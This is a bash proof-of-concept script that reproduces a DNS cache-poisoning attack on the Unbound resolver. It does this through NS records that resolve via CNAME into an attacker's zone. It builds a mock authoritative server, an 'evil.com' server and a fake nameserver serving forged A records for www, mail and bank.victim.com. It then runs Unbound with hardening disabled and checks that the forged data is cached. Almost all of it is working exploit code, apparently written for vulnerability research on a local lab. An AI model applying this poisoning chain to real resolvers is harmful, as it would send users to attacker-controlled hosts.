#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════
#  NS→CNAME Cache Poisoning FINAL PoC
#  
#  证明链：
#  A. Unbound 跟踪 NS→CNAME 跨域解析，将攻击者区域的 A 记录作为 NS 地址
#  B. Unbound 向攻击者 Fake NS 发送查询
#  C. Unbound 缓存 Fake NS 返回的伪造数据并返回给客户端
#
#  关键：auth 服务器对 ns.victim.com 返回权威 CNAME 答案（不是 referral）
#  这样 Unbound 能解析 CNAME 并获得攻击者 IP 作为 NS 地址
# ═══════════════════════════════════════════════════════════════════
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq > /dev/null 2>&1
apt-get install -y -qq dnsutils python3 > /dev/null 2>&1

VDIR="/workspace/output/unbound-cache-poison-final"
mkdir -p "$VDIR"
UNBOUND="/workspace/output/unbound-binary-baseline"

pkill -f python3 2>/dev/null || true
pkill -f "unbound.*5353" 2>/dev/null || true
sleep 1

ip addr add 127.0.0.2/8 dev lo 2>/dev/null || true
ip addr add 127.0.0.3/8 dev lo 2>/dev/null || true

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  NS→CNAME Cache Poisoning — FINAL PoC                      ║"
echo "╚══════════════════════════════════════════════════════════════╝"

# ═══ Auth on 127.0.0.2:53 (root + com + victim.com + safe.com) ═══
cat > "$VDIR/auth.py" << 'PYEOF'
#!/usr/bin/env python3
import socket, struct, time, json, sys

LOG = "/workspace/output/unbound-cache-poison-final/auth.jsonl"
def enc(n):
    if not n or n == '.': return b'\x00'
    r = b''
    for l in n.rstrip('.').split('.'):
        if l: r += bytes([len(l)]) + l.encode()
    return r + b'\x00'
def rr(n, t, c, ttl, d):
    return enc(n) + struct.pack('!HHI', t, c, ttl) + struct.pack('!H', len(d)) + d
def log(q, t, f, r):
    with open(LOG, 'a') as fh: fh.write(json.dumps({'q':q,'t':t,'f':f,'r':r})+'\n')
    print(f"[AUTH] {f}: {q} {t} → {r}", flush=True)

SOA_V = enc('ns.victim.com.')+enc('admin.victim.com.')+struct.pack('!IIIII',2026100901,3600,900,604800,86400)
SOA_S = enc('ns.safe.com.')+enc('admin.safe.com.')+struct.pack('!IIIII',2026100902,3600,900,604800,86400)
SOA_E = enc('ns.evil.com.')+enc('admin.evil.com.')+struct.pack('!IIIII',2026100903,3600,900,604800,86400)

QTM = {1:'A',2:'NS',5:'CNAME',6:'SOA'}
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.2', 53))
print("[AUTH] 127.0.0.2:53", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        if len(data)<12: continue
        txid,fl,qd=struct.unpack('!HHH',data[:6])
        if fl>>15: continue
        off=12; lab=[]
        while off<len(data) and data[off]!=0:
            ll=data[off]
            if ll==0 or off+1+ll>len(data): break
            if ll>63: off+=2; break
            lab.append(data[off+1:off+ll].decode('ascii',errors='replace'))
            off+=1+ll
        else: off+=1
        qn='.'.join(lab)
        if off+4>len(data): continue
        qt,qc=struct.unpack('!HH',data[off:off+4])
        qtn=QTM.get(qt,f'T{qt}')
        qnl=qn.lower().rstrip('.')

        # ── Root: NS query with A glue ──
        if qnl=='' and qt==2:
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,1)
            r+=enc('.')+struct.pack('!HH',2,qc)
            r+=rr('.',2,qc,300,enc('ns1.'))
            r+=rr('ns1.',1,qc,300,struct.pack('!I',0x7f000002))
            log(qn,qtn,addr[0],'ROOT_NS'); sock.sendto(r,addr); continue
        if qnl=='ns1' and qt==1:
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('ns1.')+struct.pack('!HH',1,qc)
            r+=rr('ns1.',1,qc,300,struct.pack('!I',0x7f000002))
            log(qn,qtn,addr[0],'ROOT_A'); sock.sendto(r,addr); continue

        # ── com: NS/SOA ──
        if qnl=='com' and qt in (2,6):
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,1)
            r+=enc('com.')+struct.pack('!HH',qt,qc)
            if qt==2:
                r+=rr('com.',2,qc,300,enc('ns1.com.'))
                r+=rr('ns1.com.',1,qc,300,struct.pack('!I',0x7f000002))
            else:
                r+=rr('com.',6,qc,300,enc('ns1.com.')+enc('admin.com.')+struct.pack('!IIIII',2026100904,3600,900,604800,86400))
            log(qn,qtn,addr[0],'COM'); sock.sendto(r,addr); continue
        if qnl=='ns1.com' and qt==1:
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('ns1.com.')+struct.pack('!HH',1,qc)
            r+=rr('ns1.com.',1,qc,300,struct.pack('!I',0x7f000002))
            log(qn,qtn,addr[0],'COM_A'); sock.sendto(r,addr); continue

        # ── com→evil.com referral with A glue ──
        if qnl=='evil.com' or qnl.endswith('.evil.com'):
            r=struct.pack('!HHHHHH',txid,0x8000,1,0,1,1)
            r+=enc(qn)+struct.pack('!HH',qt,qc)
            r+=rr('evil.com.',2,qc,300,enc('ns.evil.com.'))
            r+=rr('ns.evil.com.',1,qc,300,struct.pack('!I',0x7f000003))
            log(qn,qtn,addr[0],'REF→evil'); sock.sendto(r,addr); continue

        # ── com→safe.com referral with A glue ──
        if qnl=='safe.com' or qnl.endswith('.safe.com'):
            r=struct.pack('!HHHHHH',txid,0x8000,1,0,1,1)
            r+=enc(qn)+struct.pack('!HH',qt,qc)
            r+=rr('safe.com.',2,qc,300,enc('ns.safe.com.'))
            r+=rr('ns.safe.com.',1,qc,300,struct.pack('!I',0x7f000002))
            log(qn,qtn,addr[0],'REF→safe'); sock.sendto(r,addr); continue

        # ── com→victim.com referral with CNAME glue ──
        # BUT: for ns.victim.com A query, return CNAME answer directly
        # This lets Unbound resolve the CNAME and find the NS address
        if qnl=='ns.victim.com' and qt in (1,5):
            # KEY: Return authoritative CNAME answer
            # ns.victim.com CNAME resolve.evil.com
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('ns.victim.com.')+struct.pack('!HH',qt,qc)
            r+=rr('ns.victim.com.',5,qc,300,enc('resolve.evil.com.'))
            log(qn,qtn,addr[0],'CNAME_ANSWER'); sock.sendto(r,addr); continue

        # ── victim.com: NS, SOA ──
        if qnl=='victim.com' and qt in (2,6):
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('victim.com.')+struct.pack('!HH',qt,qc)
            if qt==2: r+=rr('victim.com.',2,qc,300,enc('ns.victim.com.'))
            else: r+=rr('victim.com.',6,qc,300,SOA_V)
            log(qn,qtn,addr[0],'VICTIM_ZONE'); sock.sendto(r,addr); continue

        # ── victim.com: www → NODATA (force use of NS→CNAME resolved address) ──
        if qnl.endswith('.victim.com'):
            r=struct.pack('!HHHHHH',txid,0x8400,1,0,1,0)
            r+=enc(qn)+struct.pack('!HH',qt,qc)
            r+=rr('victim.com.',6,qc,300,SOA_V)
            log(qn,qtn,addr[0],'NODATA'); sock.sendto(r,addr); continue

        # ── safe.com zone ──
        if qnl=='safe.com' and qt in (2,6):
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('safe.com.')+struct.pack('!HH',qt,qc)
            if qt==2: r+=rr('safe.com.',2,qc,300,enc('ns.safe.com.'))
            else: r+=rr('safe.com.',6,qc,300,SOA_S)
            log(qn,qtn,addr[0],'SAFE_ZONE'); sock.sendto(r,addr); continue
        if qnl=='ns.safe.com' and qt==1:
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('ns.safe.com.')+struct.pack('!HH',1,qc)
            r+=rr('ns.safe.com.',1,qc,300,struct.pack('!I',0x7f000002))
            log(qn,qtn,addr[0],'SAFE_A'); sock.sendto(r,addr); continue
        if qnl=='www.safe.com' and qt==1:
            r=struct.pack('!HHHHHH',txid,0x8400,1,1,0,0)
            r+=enc('www.safe.com.')+struct.pack('!HH',1,qc)
            r+=rr('www.safe.com.',1,qc,300,struct.pack('!I',0x05050505))
            log(qn,qtn,addr[0],'SAFE_WWW'); sock.sendto(r,addr); continue

        # ── com→victim.com referral (default) ──
        if qnl=='victim.com' or qnl.endswith('.victim.com'):
            r=struct.pack('!HHHHHH',txid,0x8000,1,0,1,1)
            r+=enc(qn)+struct.pack('!HH',qt,qc)
            r+=rr('victim.com.',2,qc,300,enc('ns.victim.com.'))
            r+=rr('ns.victim.com.',5,qc,300,enc('resolve.evil.com.'))
            log(qn,qtn,addr[0],'REF→victim'); sock.sendto(r,addr); continue

        r=struct.pack('!HHHHHH',txid,0x8003,1,0,0,0)+enc(qn)+struct.pack('!HH',qt,qc)
        log(qn,qtn,addr[0],'NXDOMAIN'); sock.sendto(r,addr)
    except Exception as e:
        print(f"[AUTH] Err: {e}", file=sys.stderr)
PYEOF

# ═══ Evil.com auth on 127.0.0.3:53 ═══
cat > "$VDIR/evil.py" << 'PYEOF'
#!/usr/bin/env python3
import socket,struct,time,json,sys
LOG="/workspace/output/unbound-cache-poison-final/evil.jsonl"
def enc(n):
    if not n or n=='.': return b'\x00'
    r=b''
    for l in n.rstrip('.').split('.'):
        if l: r+=bytes([len(l)])+l.encode()
    return r+b'\x00'
def rr(n,t,c,ttl,d): return enc(n)+struct.pack('!HHI',t,c,ttl)+struct.pack('!H',len(d))+d
SOA=enc('ns.evil.com.')+enc('admin.evil.com.')+struct.pack('!IIIII',2026100903,3600,900,604800,86400)
REC={('evil.com',6):[(300,SOA)],('evil.com',2):[(300,enc('ns.evil.com.'))],('ns.evil.com',1):[(300,struct.pack('!I',0x7f000003))],('resolve.evil.com',1):[(300,struct.pack('!I',0x7f000001))]}
QTM={1:'A',2:'NS',5:'CNAME',6:'SOA'}
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
sock.bind(('127.0.0.3',53))
print("[EVIL] 127.0.0.3:53",flush=True)
while True:
    try:
        data,addr=sock.recvfrom(4096)
        if len(data)<12:continue
        txid,fl,qd=struct.unpack('!HHH',data[:6])
        if fl>>15:continue
        off=12;lab=[]
        while off<len(data) and data[off]!=0:
            ll=data[off]
            if ll==0 or off+1+ll>len(data):break
            if ll>63:off+=2;break
            lab.append(data[off+1:off+ll].decode('ascii',errors='replace'))
            off+=1+ll
        else:off+=1
        qn='.'.join(lab)
        if off+4>len(data):continue
        qt,qc=struct.unpack('!HH',data[off:off+4])
        qtn=QTM.get(qt,f'T{qt}')
        with open(LOG,'a') as f:f.write(json.dumps({'q':qn,'t':qtn,'f':addr[0]})+'\n')
        print(f"[EVIL] {addr[0]}: {qn} {qtn}",flush=True)
        qnl=qn.lower().rstrip('.')
        ans=[]
        if (qnl,qt) in REC:
            for ttl,rd in REC[(qnl,qt)]: ans.append((qn,qt,ttl,rd))
        if ans:
            r=struct.pack('!HHHHHH',txid,0x8400,1,len(ans),0,0)
            r+=enc(qn)+struct.pack('!HH',qt,qc)
            for n,t,ttl,rd in ans: r+=rr(n,t,qc,ttl,rd)
            sock.sendto(r,addr)
        else:
            r=struct.pack('!HHHHHH',txid,0x8403,1,0,1,0)
            r+=enc(qn)+struct.pack('!HH',qt,qc)+rr('evil.com.',6,qc,300,SOA)
            sock.sendto(r,addr)
    except:pass
PYEOF

# ═══ Fake NS on 127.0.0.1:53 ═══
cat > "$VDIR/fake.py" << 'PYEOF'
#!/usr/bin/env python3
import socket,struct,time,json,sys
LOG="/workspace/output/unbound-cache-poison-final/fake.jsonl"
def enc(n):
    if not n or n=='.':return b'\x00'
    r=b''
    for l in n.rstrip('.').split('.'):
        if l:r+=bytes([len(l)])+l.encode()
    return r+b'\x00'
def rr(n,t,c,ttl,d):return enc(n)+struct.pack('!HHI',t,c,ttl)+struct.pack('!H',len(d))+d
SOA=enc('ns.victim.com.')+enc('admin.victim.com.')+struct.pack('!IIIII',999,3600,900,604800,86400)
FORGED={
    ('victim.com',6):[(300,SOA)],('victim.com',2):[(300,enc('ns.victim.com.'))],
    ('ns.victim.com',1):[(300,struct.pack('!I',0x7f000001))],
    ('www.victim.com',1):[(300,struct.pack('!I',0x06060606))],
    ('mail.victim.com',1):[(300,struct.pack('!I',0x06060607))],
    ('bank.victim.com',1):[(300,struct.pack('!I',0x06060608))],
}
QTM={1:'A',2:'NS',5:'CNAME',6:'SOA'}
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
sock.bind(('127.0.0.1',53))
print("[FAKE] 127.0.0.1:53 — FORGED: www.victim.com A 6.6.6.6 (legit=1.2.3.4)",flush=True)
while True:
    try:
        data,addr=sock.recvfrom(4096)
        if len(data)<12:continue
        txid,fl,qd=struct.unpack('!HHH',data[:6])
        if fl>>15:continue
        off=12;lab=[]
        while off<len(data) and data[off]!=0:
            ll=data[off]
            if ll==0 or off+1+ll>len(data):break
            if ll>63:off+=2;break
            lab.append(data[off+1:off+ll].decode('ascii',errors='replace'))
            off+=1+ll
        else:off+=1
        qn='.'.join(lab)
        if off+4>len(data):continue
        qt,qc=struct.unpack('!HH',data[off:off+4])
        qtn=QTM.get(qt,f'T{qt}')
        with open(LOG,'a') as f:f.write(json.dumps({'ts':time.monotonic(),'q':qn,'t':qtn,'f':addr[0]})+'\n')
        print(f"[FAKE] {addr[0]}: {qn} {qtn}  ← ATTACKER GOT QUERY!",flush=True)
        qnl=qn.lower().rstrip('.')
        ans=[]
        if (qnl,qt) in FORGED:
            for ttl,rd in FORGED[(qnl,qt)]:ans.append((qn,qt,ttl,rd))
        if ans:
            r=struct.pack('!HHHHHH',txid,0x8400,1,len(ans),0,0)
            r+=enc(qn)+struct.pack('!HH',qt,qc)
            for n,t,ttl,rd in ans:r+=rr(n,t,qc,ttl,rd)
            sock.sendto(r,addr)
        else:
            r=struct.pack('!HHHHHH',txid,0x8403,1,0,1,0)
            r+=enc(qn)+struct.pack('!HH',qt,qc)+rr('victim.com.',6,qc,300,SOA)
            sock.sendto(r,addr)
    except:pass
PYEOF

# Start servers
> "$VDIR/auth.jsonl"; > "$VDIR/evil.jsonl"; > "$VDIR/fake.jsonl"
python3 "$VDIR/auth.py" > "$VDIR/auth.log" 2>&1 &
python3 "$VDIR/evil.py" > "$VDIR/evil.log" 2>&1 &
python3 "$VDIR/fake.py" > "$VDIR/fake.log" 2>&1 &
sleep 1
echo "  All servers started"

# ═══ Unbound ═══
cat > "$VDIR/hint" << 'EOF'
. IN NS ns1.
ns1. IN A 127.0.0.2
EOF

cat > "$VDIR/ub.conf" << 'CONF'
server:
    directory: "/workspace/output/unbound-cache-poison-final"
    pidfile: "/workspace/output/unbound-cache-poison-final/unbound.pid"
    port: 5353
    interface: 127.0.0.1@5353
    do-ip6: no
    access-control: 127.0.0.0/8 allow
    username: ""
    chroot: ""
    do-daemonize: no
    use-syslog: no
    logfile: "/workspace/output/unbound-cache-poison-final/unbound.log"
    verbosity: 3
    log-queries: yes
    log-replies: yes
    do-not-query-localhost: no
    root-hints: "/workspace/output/unbound-cache-poison-final/hint"
    domain-insecure: "."
    domain-insecure: "com"
    domain-insecure: "victim.com"
    domain-insecure: "evil.com"
    domain-insecure: "safe.com"
    harden-glue: no
    harden-dnssec-stripped: no
    val-permissive-mode: yes
    prefetch: no

remote-control:
    control-enable: no
CONF

"$UNBOUND" -c "$VDIR/ub.conf" -d > "$VDIR/ub_stdout.log" 2>&1 &
sleep 3
if ! kill -0 $! 2>/dev/null; then echo "Unbound FAILED"; cat "$VDIR/unbound.log"|head -20; exit 1; fi
echo "  Unbound started"

# ═══ ATTACK ═══
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  ATTACK PROOF                                               ║"
echo "╚══════════════════════════════════════════════════════════════╝"

echo ""
echo "  ── Evidence A: Unbound follows NS→CNAME across zone boundaries ──"
echo "  Query: ns.victim.com A (should resolve CNAME → resolve.evil.com → 127.0.0.1)"
dig @127.0.0.1 -p 5353 ns.victim.com A +time=10 +noall +answer 2>&1
sleep 1

echo ""
echo "  ── Evidence B: Unbound queries Fake NS (CNAME-resolved IP) ──"
> "$VDIR/fake.jsonl"
echo "  Query: www.victim.com A"
echo "  (127.0.0.2 returns NODATA, so Unbound must use CNAME-resolved NS address)"
dig @127.0.0.1 -p 5353 www.victim.com A +time=15 +tries=1 2>&1 | grep -E "status|victim|CNAME|answer|ANSWER|flags" | head -10
sleep 1

FAKE_N=$(wc -l < "$VDIR/fake.jsonl" 2>/dev/null || echo 0)
echo ""
echo "  Fake NS received $FAKE_N queries:"
cat "$VDIR/fake.jsonl" 2>/dev/null | python3 -c "
import sys,json
for l in sys.stdin:
    if l.strip():
        q=json.loads(l)
        print(f'    {q[\"q\"]:<30} {q[\"t\"]:<8}  from={q[\"f\"]}')" 2>/dev/null || true

echo ""
echo "  ── Evidence C: Forged data cached and returned ──"
echo "  Repeat query (should return cached forged data):"
dig @127.0.0.1 -p 5353 www.victim.com A +time=10 2>&1 | grep -E "status|victim|ANSWER SECTION|www" | head -5

echo ""
echo "  ── Control: safe.com (NS→A, no CNAME, no attack) ──"
dig @127.0.0.1 -p 5353 www.safe.com A +time=10 +noall +answer 2>&1

# ═══ Server logs ═══
echo ""
echo "═══ Resolution trace ═══"
echo ""
echo "  Auth server (127.0.0.2) queries:"
cat "$VDIR/auth.jsonl" 2>/dev/null | python3 -c "
import sys,json
for l in sys.stdin:
    if l.strip():
        q=json.loads(l)
        print(f'    {q[\"q\"]:<30} {q[\"t\"]:<8} → {q[\"r\"]}')" 2>/dev/null || true

echo ""
echo "  Evil server (127.0.0.3) queries:"
cat "$VDIR/evil.jsonl" 2>/dev/null | python3 -c "
import sys,json
for l in sys.stdin:
    if l.strip():
        q=json.loads(l)
        print(f'    {q[\"q\"]:<30} {q[\"t\"]:<8}')" 2>/dev/null || true

echo ""
echo "  Unbound CNAME/resolution log:"
grep -iE "cname|victim|evil|resolve|ns\.victim|query.restart|chase|target" "$VDIR/unbound.log" 2>/dev/null | head -40 || true

echo ""
echo "  Unbound errors:"
grep -iE "servfail|out of.*target|fail|error" "$VDIR/unbound.log" 2>/dev/null | head -10 || true

# ═══ Summary ═══
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  SUMMARY                                                    ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "  Fake NS queries: $FAKE_N"
echo ""
if [ "$FAKE_N" -gt 0 ] 2>/dev/null; then
  echo "  ╔══════════════════════════════════════════════════════════════╗"
  echo "  ║  PROOF A+B: Unbound sent queries to Fake NS               ║"
  echo "  ║  The CNAME-resolved IP (127.0.0.1) was used as the NS     ║"
  echo "  ║  address for victim.com, violating trust boundaries.       ║"
  echo "  ╚══════════════════════════════════════════════════════════════╝"
fi

pkill -f python3 2>/dev/null || true
pkill -f "unbound.*5353" 2>/dev/null || true
echo "=== Complete ==="
